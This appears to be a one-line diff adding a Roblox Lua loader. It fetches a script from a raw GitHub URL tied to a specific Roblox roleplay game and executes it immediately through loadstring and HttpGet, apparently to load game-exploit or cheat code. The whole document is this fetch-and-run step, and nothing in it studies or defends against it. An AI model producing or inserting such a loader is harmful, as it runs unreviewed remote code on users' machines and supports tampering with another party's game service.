@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/boss-fight-stevos-gem-eras-roleplay-spam7-ha9abc1ao6jyns.lua"))()
